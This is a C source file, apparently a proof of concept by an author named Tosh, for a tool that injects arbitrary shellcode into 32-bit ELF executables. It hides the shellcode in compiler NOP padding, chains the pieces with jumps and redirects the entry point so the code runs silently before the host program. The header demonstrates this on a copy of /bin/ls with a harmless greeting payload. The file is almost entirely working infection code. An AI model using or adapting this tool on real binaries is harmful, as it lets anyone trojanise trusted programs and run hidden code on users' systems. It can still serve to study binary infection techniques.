/* Proof Of Concept : ELF32 code injection
 * Author : Tosh
 *
 * This program insert a code in ELF file without break
 * the host file.
 *
 * The code is executed when the program start and execution is
 * redirected to old entry point when it's finished.
 *
 * Code is splited and inserted in NOP padding used by the compiler 
 * to alignement.
 * The splited code is then chained with jmps.
 *
 * Exemple :
 * $ cp /bin/ls .
 *
 * $ ./elfinject ./ls \
 * > "\x60\x6a\x0a\x68\x6f\x21\x21\x21"\
 * > "\x68\x48\x65\x6c\x6c\xb8\x04\x00"\
 * > "\x00\x00\xbb\x01\x00\x00\x00\x89"\
 * > "\xe1\xba\x09\x00\x00\x00\xcd\x80"\
 * > "\x83\xc4\x0c\x61"
 *
 *
 * [+] Loading ELF in memory...
 * [+] Creating the CHUNKLST...
 * [+] CHUNKS: 35, TOTAL LENGTH: 219
 * [+] Creating the INSTRLST...
 * [+] Old entry point : 0x0804c090
 * [+] Inserting code in ELF...
 * [+] New entry : 0x0805532a
 * [+] Inserted code INFO :
 *   OFFSET      ADDR         LEN INSTR
 *   0x0000d32a  0x0805532a   01  pusha
 *   0x0000d549  0x08055549   02  push byte 0xa
 *   0x0000a176  0x08052176   05  push dword 0x2121216f
 *   0x0000aa76  0x08052a76   05  push dword 0x6c6c6548
 *   0x00010f06  0x08058f06   05  mov eax,0x4
 *   0x00011376  0x08059376   05  mov ebx,0x1
 *   0x0000d869  0x08055869   02  mov ecx,esp
 *   0x0000ba55  0x08053a55   05  mov edx,0x9
 *   0x00001d17  0x08049d17   02  int 0x80
 *   0x00009af7  0x08051af7   03  add esp,0xc
 *   0x0000d7aa  0x080557aa   01  popa
 * [+] Freeing all structures...
 * [+] DONE.
 *
 *
 * $ ./ls
 * Hello!!!
 * elfinject  inject.c  libdasm.c  libdasm.h  ls  opcode_tables.h
 *
 *
 * As you can see, your code is executed, and the host program run
 * correctly.
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <elf.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <getopt.h>
#include "libdasm.h"

typedef struct ELF {
  Elf32_Ehdr *ehdr;
  Elf32_Phdr *phdr;
  Elf32_Shdr *shdr;
  uint8_t *data;
  uint32_t length;
}ELF;

typedef struct CHUNK {
  int used;
  uint32_t offset;
  uint32_t addr;
  uint32_t length;
  struct CHUNK *next;
}CHUNK;

typedef struct INSTR {
  char *inst;
  uint8_t *code;
  uint32_t length;
  uint32_t offset;
  uint32_t addr;
  struct INSTR *next;
}INSTR;

typedef struct LST {
  void *head;
  void *tail;
}INSTRLST, CHUNKLST;

#define JMP_LENGTH 5
#define NOP 0x90
#define JMP 0xe9
#define RET 0xc3


#define SYSCALL_FATAL_ERROR(...) do {			\
    fprintf(stderr, "[-] ");				\
    fprintf(stderr, __VA_ARGS__);			\
    fprintf(stderr, " : %s\n", strerror(errno));	\
    exit(EXIT_FAILURE);					\
  }while(0)

#define FATAL_ERROR(...) do {			\
  fprintf(stderr, "[-] ");			\
  fprintf(stderr, __VA_ARGS__);			\
  fprintf(stderr, "\n");			\
  exit(EXIT_FAILURE);				\
  }while(0)

#define INFO(...) do {				\
    fprintf(stdout, "[+] ");			\
    fprintf(stdout, __VA_ARGS__);		\
    fprintf(stdout, "\n");			\
  }while(0)

/*=========================================================
  =
  = Misc functions
  =
  ========================================================*/
/* Duplicate memory */
void* memdup(void *ptr, size_t len) {
  void *ret;

  if((ret = malloc(len)) == NULL)
    return NULL;

  memcpy(ret, ptr, len);

  return ret;
}

/* Calculate jmp */
uint32_t calc_jmp(uint32_t addr1, uint32_t addr2) {
  return addr2 - addr1;
}

/* Convert 'a' -> 10 */
int hex_to_dec(int c) {
  if(isdigit(c))
    return c - '0';
  if(c >= 'a' && c <= 'f')
    return (c - 'a') + 10;
  if(c >= 'A' && c <= 'F')
    return (c - 'A') + 10;
  
  return -1;
}

/* Test if char is in range [0-9a-fA-F] */
int is_hexa_char(int c) {
  return (isdigit(c) 
	  || (c >= 'a' && c <= 'f') 
	  || (c >= 'A' && c <= 'F'));
}

/* Convert "\x0a\x2c..." to raw data */
uint8_t* opcodes_to_data(char *str, uint32_t *length) {
  int i;
  uint8_t *data;
 
 i = 0;
 if((data = malloc(strlen(str) + 1)) == NULL)
   SYSCALL_FATAL_ERROR("Can't allocate data");

 while(*str != '\0') {
   if(str[0] == '\\' && str[1] == 'x') {
     if(is_hexa_char(str[2]) && is_hexa_char(str[3])) {
       data[i] = hex_to_dec(str[2]) * 16;
       data[i] += hex_to_dec(str[3]);
       str += 3;
     }
   } else {
     data[i] = *str;
   }
   str++;
   i++;
 }
 *length = i;
 return data;
}

/*=========================================================
  =
  = ELF functions
  =
  ========================================================*/

/* Check ELF phdr table */
void ELF_checkPhdr(ELF *elf) {
  Elf32_Ehdr *ehdr;
  Elf32_Phdr *phdr;
  uint32_t i;

  ehdr = (Elf32_Ehdr*)elf->data;
  phdr = (Elf32_Phdr*)(elf->data + ehdr->e_phoff);

  for(i = 0; i < ehdr->e_phnum; i++) {
    if(phdr[i].p_offset >= elf->length)
      FATAL_ERROR("ELF: bad p_offset for segment %u", i);

    if(phdr[i].p_offset > 0xFFFFFFFF-phdr[i].p_filesz)
      FATAL_ERROR("ELF: overflow in p_offset for segment %u", i);

    if(phdr[i].p_offset + phdr[i].p_filesz > elf->length)
      FATAL_ERROR("ELF: bad p_filesz for segment %u", i);
  }
}

/* Check ELF file */
void ELF_check(ELF *elf) {
  Elf32_Ehdr *ehdr;

  if(elf->length < sizeof(Elf32_Ehdr))
    FATAL_ERROR("ELF: bad length");

  if(memcmp(elf->data, ELFMAG, SELFMAG))
    FATAL_ERROR("ELF: bad ELFMAG");

  ehdr = (Elf32_Ehdr*)elf->data;

  if(ehdr->e_ident[EI_CLASS] != ELFCLASS32)
    FATAL_ERROR("ELF: EI_CLASS not supported");

  if(ehdr->e_phoff >= elf->length)
    FATAL_ERROR("ELF: bad e_phoff");

  if(ehdr->e_phoff > 0xFFFFFFFF-(ehdr->e_phnum*sizeof(Elf32_Phdr)))
    FATAL_ERROR("ELF: overflow in e_phoff");

  if(ehdr->e_phoff + ehdr->e_phnum*sizeof(Elf32_Phdr) >= elf->length)
    FATAL_ERROR("ELF: bad e_phoff");

  ELF_checkPhdr(elf);
}

/* Mmap ELF in memory */
void ELF_load(ELF *elf, const char *filename) {
  struct stat st;
  int fd;

  if((fd = open(filename, O_RDWR)) < 0)
    SYSCALL_FATAL_ERROR("Can't open %s", filename);
  
  if(fstat(fd, &st) < 0)
    SYSCALL_FATAL_ERROR("Fstat failed");
  
  elf->data = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if(elf->data == MAP_FAILED)
    SYSCALL_FATAL_ERROR("Mmap failed");

  elf->length = st.st_size;

  ELF_check(elf);

  elf->ehdr = (Elf32_Ehdr*)elf->data;
  elf->shdr = (Elf32_Shdr*)(elf->data + elf->ehdr->e_shoff);
  elf->phdr = (Elf32_Phdr*)(elf->data + elf->ehdr->e_phoff);

  close(fd);
}


/* Munmap file */
void ELF_unload(ELF *elf) {
  munmap(elf->data, elf->length);
}

/* Insert code in ELF */
void ELF_insCode(ELF *elf, INSTRLST *lst) {
  uint8_t jmp_code[JMP_LENGTH];
  uint32_t jmp;
  INSTR *p;

  for(p = lst->head; p != NULL; p = p->next) {
    jmp_code[0] = JMP;

    if(p->next == NULL) {
      jmp = calc_jmp(p->addr + p->length + JMP_LENGTH, elf->ehdr->e_entry);
      memcpy(jmp_code + 1, &jmp, JMP_LENGTH-1);
    } else {
      jmp = calc_jmp(p->addr + p->length + JMP_LENGTH, p->next->addr);
      memcpy(jmp_code + 1, &jmp, JMP_LENGTH-1);
    }
    memcpy(elf->data+p->offset, p->code, p->length);
    memcpy(elf->data+p->offset+p->length, jmp_code, JMP_LENGTH);
  }

  if(lst->head != NULL)
    elf->ehdr->e_entry = ((INSTR*)lst->head)->addr;
}

/*=========================================================
  =
  = CHUNK functions
  =
  ========================================================*/

/* Free a chunk */
void CHUNK_free(CHUNK *chk) {
  free(chk);
}

/* Allocate a new chunk */
CHUNK* CHUNK_new(uint32_t addr, uint32_t offset, uint32_t length) {
  CHUNK *chk;

  if((chk = malloc(sizeof(CHUNK))) == NULL)
    SYSCALL_FATAL_ERROR("Malloc failed");

  chk->addr = addr;
  chk->offset = offset;
  chk->length = length;
  chk->used = 0;
  chk->next = NULL;

  return chk;
}

/*=========================================================
  =
  = CHUNKLST functions
  =
  ========================================================*/

/* Free a CHUNKLST */
void CHUNKLST_free(CHUNKLST *lst) {
  CHUNK *p, *tmp;

  p = lst->head;

  while(p != NULL) {
    tmp = p->next;
    CHUNK_free(p);
    p = tmp;
  }
  free(lst);
}

/* Allocate a new chunk_lst */
CHUNKLST* CHUNKLST_new(void) {
  CHUNKLST *lst;

  if((lst = malloc(sizeof(CHUNKLST))) == NULL)
    SYSCALL_FATAL_ERROR("Can't allocate CHUNKLST");

  lst->head = NULL;
  lst->tail = NULL;

  return lst;
}

/* Return the number of chunks */
uint32_t CHUNKLST_length(CHUNKLST *lst) {
  uint32_t length;
  CHUNK *p;

  length = 0;

  for(p = lst->head; p != NULL; p = p->next) {
    length++;
  }
  return length;
}

uint32_t CHUNKLST_totLength(CHUNKLST *lst) {
  uint32_t length;
  CHUNK *p;

  length = 0;

  for(p = lst->head; p != NULL; p = p->next) {
    length += p->length;
  }
  return length;
}

/* Print a chunk list */
void CHUNKLST_print(CHUNKLST *lst) {
  uint32_t total_length;
  uint32_t num;
  CHUNK *p;

  total_length = 0;
  num = 0;

  for(p = lst->head; p != NULL; p = p->next) {
    printf("%03d => 0x%.8x  => %u\n", num+1, p->addr, p->length);
    total_length += p->length;
    num++;
  }
  printf("TOTAL length : %u\n", total_length);
}

/* Return the smallest chunk which match minimum length */
const CHUNK* CHUNKLST_getSmallest(CHUNKLST *lst, uint32_t length) {
  uint32_t cur_length;
  CHUNK *cur_chunk;
  CHUNK* p;

  cur_chunk = NULL;
  cur_length = 0xFFFFFFFF;

  for(p = lst->head; p != NULL && cur_length != length; p = p->next) {
    if(!p->used) {
      if(p->length >= length && p->length < cur_length) {
	cur_chunk = p;
	cur_length = p->length;
      }
    }
  }

  if(cur_chunk != NULL)
    cur_chunk->used = 1;

  return cur_chunk;
}


/* Insert a chunk at end of the list */
void CHUNKLST_insert(CHUNKLST *lst, CHUNK *chunk) {
  CHUNK *tail = lst->tail;

  if(lst->head == NULL) 
     lst->head = chunk;
   if(tail == NULL) {
     lst->tail = chunk;
   } else {
     tail->next = chunk;
     lst->tail = chunk;
   }
}

/* Parse Phnum and store all chunks in CHUNKLST */
void CHUNKLST_parsePhnum(CHUNKLST *lst, ELF *elf, int phnum) {
  CHUNK *new;
  uint32_t i, length, j;
  Elf32_Phdr *ph;
  
  ph = &elf->phdr[phnum];

  for(i = ph->p_offset; i < ph->p_filesz; i++) {
    length = 0;
    for(j = i; j < ph->p_filesz-1; j++) {
      /* xchg ax,ax */
      if(elf->data[j] == 0x66 && elf->data[j+1] == 0x90) {
	length += 2;
      /* nop */
      }else if(elf->data[j] == 0x90) {
	length += 1;
      } else {
	break;
      }
    }
    if(length > JMP_LENGTH) {
      new = CHUNK_new(ph->p_vaddr + i, ph->p_offset + i, length - JMP_LENGTH);
      CHUNKLST_insert(lst, new);
    }
    i = j;
  }
}

/* Parse ELF and store all chunks in CHUNKLST */
void CHUNKLST_parseElf(CHUNKLST *lst, ELF *elf) {
  int i;

  for(i = 0; i < elf->ehdr->e_phnum; i++) {
    if(elf->phdr[i].p_type == PT_LOAD) {
      if(elf->phdr[i].p_flags & PF_X) {
	CHUNKLST_parsePhnum(lst, elf, i);
      }
    }
  }
}

/*=========================================================
  =
  = INSTR functions
  =
  ========================================================*/

/* free INSTR */
void INSTR_free(INSTR *instr) {
  free(instr->code);
  free(instr->inst);
  free(instr);
}

/* Allocate a new INSTR */
INSTR* INSTR_new(uint8_t *code, uint32_t length, const char *inst,
		 uint32_t addr, uint32_t offset) {
  INSTR *new;

  if((new = malloc(sizeof(INSTR))) == NULL)
    SYSCALL_FATAL_ERROR("Malloc failed");

  new->code = memdup(code, length);
  new->length = length;
  new->inst = strdup(inst);
  new->offset = offset;
  new->addr = addr;
  new->next = NULL;

  return new;
}

/*=========================================================
  =
  = INSTRLST functions
  =
  ========================================================*/

/* Free a INSTRLST */
void INSTRLST_free(INSTRLST *lst) {
  INSTR *p, *tmp;

  p = lst->head;
  while(p != NULL) {
    tmp = p->next;
    INSTR_free(p);
    p = tmp;
  }
  free(lst);
}

/* Allocate a new INSTRLST */
INSTRLST* INSTRLST_new(void) {
  INSTRLST *lst;

  if((lst = malloc(sizeof(INSTRLST))) == NULL)
    SYSCALL_FATAL_ERROR("Malloc failed");

  lst->tail = NULL;
  lst->head = NULL;

  return lst;
}

/* Insert a INSTR in INSTRLST at the end of the list*/
void INSTRLST_insert(INSTRLST *lst, INSTR *inst) {
  INSTR *tail = lst->tail;

   if(lst->head == NULL) 
     lst->head = inst;
   if(lst->tail == NULL) {
     lst->tail = inst;
   } else {
     tail->next = inst;
     lst->tail = inst;
   }
}

void INSTRLST_parseCode(INSTRLST *lst, CHUNKLST *chklst, 
			uint8_t *code, uint32_t length) {
  INSTRUCTION inst;
  char tmp[64];
  uint32_t i;
  INSTR *new;
  const CHUNK *chk;

  i = 0;

  while(i < length) {
    get_instruction(&inst, code + i, MODE_32);
    if(inst.length == 0)
      FATAL_ERROR("Code seems to be bad");

    chk = CHUNKLST_getSmallest(chklst, inst.length);
    if(chk == NULL)
      FATAL_ERROR("Code seems too long");

    get_instruction_string(&inst, FORMAT_INTEL, 0, tmp, sizeof(tmp));
    new = INSTR_new(code+i, inst.length, tmp, 
		    chk->addr, chk->offset);
    INSTRLST_insert(lst, new);
    i += inst.length;
  }
}

void INSTRLST_print(INSTRLST *lst) {
  INSTR *p;

  printf("    OFFSET      ADDR         LEN INSTR\n");
  for(p = lst->head; p != NULL; p = p->next) {
    printf("    0x%.8x  0x%.8x   %02u  %s\n", 
	   p->offset, p->addr, p->length, p->inst);
  }
}
/*=========================================================
  =
  = ENTRY functions
  =
  ========================================================*/

int main(int argc, char **argv) {
  uint8_t *sc;
  uint32_t sc_length;
  CHUNKLST *ch_lst;
  INSTRLST *in_lst;
  ELF elf;

  if(argc != 3) {
    FATAL_ERROR("Usage : %s <filename> <code>", argv[0]);
  }

  sc = opcodes_to_data(argv[2], &sc_length);

  INFO("Loading ELF in memory...");
  ELF_load(&elf, argv[1]);

  ch_lst = CHUNKLST_new();
  in_lst = INSTRLST_new();

  INFO("Creating the CHUNKLST...");
  CHUNKLST_parseElf(ch_lst, &elf);
  INFO("CHUNKS: %u, TOTAL LENGTH: %u",
       CHUNKLST_length(ch_lst),
       CHUNKLST_totLength(ch_lst));

  INFO("Creating the INSTRLST...");
  INSTRLST_parseCode(in_lst, ch_lst, sc, sc_length);

  INFO("Old entry point : 0x%.8x", elf.ehdr->e_entry);
  INFO("Inserting code in ELF...");
  ELF_insCode(&elf, in_lst);

  INFO("New entry : 0x%.8x", elf.ehdr->e_entry);

  INFO("Inserted code INFO :");
  INSTRLST_print(in_lst);

  INFO("Freeing all structures...");
  ELF_unload(&elf);
  CHUNKLST_free(ch_lst);
  INSTRLST_free(in_lst);

  INFO("DONE.");

  return EXIT_SUCCESS;
}
